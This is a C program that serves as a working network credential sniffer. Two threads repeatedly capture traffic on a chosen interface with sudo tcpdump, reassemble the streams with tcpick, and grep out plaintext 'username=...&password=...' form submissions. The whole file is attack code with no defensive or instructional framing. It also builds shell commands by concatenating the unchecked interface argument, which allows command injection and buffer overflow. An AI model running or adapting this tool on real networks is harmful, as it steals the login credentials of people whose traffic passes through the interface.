#include <stdio.h>
#include <stdlib.h>
#include <pthread.h> //gcc filename.c -pthread
#include <semaphore.h>
#include <unistd.h>
#include <string.h>

sem_t mutex;

struct info
{
	char* filename;
	char* interface;
};

void * capture (void* parameter)
{
	struct info *p =parameter;
	char command1[100], command2[100];
	strcpy (command1, "sudo timeout 5s tcpdump -i ");
	strcat (command1,p->interface);
	strcat (command1, " -w ");
	strcat (command1, p->filename);

	strcpy (command2, "tcpick -C -yP -r ");
	strcat (command2, p->filename);
	strcat (command2, " |grep  -o \"username=.*\\&password=.*\"");

	while (1)
	{
		sem_wait (&mutex);
		system (command1);
		sem_post (&mutex);
		printf ("%s\n","\n\n\n" );
		system (command2);
		printf ("%s\n","\n\n\n" );
	}
}

int check_requirements ()
{
	FILE *fp;
	char path[1035];

	/* Open the command for reading. */
	fp = popen ("dpkg -l | grep -o \"tcpick\\|tcpdump\"", "r"); //install tcpick & tcpdump for this
	if (fp == NULL)
	{
		printf ("Failed to run command\n" );
		exit (1);
	}

	/* Read the output a line at a time - output it. */
	if (fgets (path, sizeof (path)-1, fp) != NULL)
	{
		printf ("%s", path);
		if (strcmp (path,"tcpdump\n")!=0 && strcmp (path,"tcpick")==0)
		{
	      printf ("install tcpdump\n" );
	      pclose (fp);
	      return 1;
		}
		else
		{
			if (fgets (path, sizeof (path)-1, fp) != NULL  && strcmp (path,"tcpick\n")!=0)
			{
				printf ("%s", path);
				printf ("install tcpick\n" );
				pclose (fp);
				return 1;
			}
		}
	}
	else
	{
		printf ("Install tcpdump and tcpick\n" );
		pclose (fp);
		return 1;
	}

	/* close */
	pclose (fp);
	return 0;
}

int main (int argc, char* argv[])
{
	if (check_requirements ()==0)
	{
		printf ("%s\n","We are good to go!!" );
	}
	else
		exit (0);

	if (argc < 2)
	{
		printf ("%d",argc);
		printf ("\n Format: sudo ./a.out <interface_name>");
		printf ("\n%s\n", "exiting");
		exit (0);
	}

	struct info p1,p2;
	p1.interface = argv[1];
	p2.interface = argv[1];
	p1.filename = "temp1.pcap";
	p2.filename = "temp2.pcap";
	// printf
	// capture (&p1);
	sem_init (&mutex, 0, 1);
	pthread_t t1,t2;
	pthread_attr_t attr;
	pthread_attr_init (&attr);

	pthread_create (&t1,&attr,capture,&p1);
	pthread_create (&t2,&attr,capture,&p2);

	pthread_join (t1,NULL);
	pthread_join (t2,NULL);

	sem_destroy (&mutex);

	return 0;
}
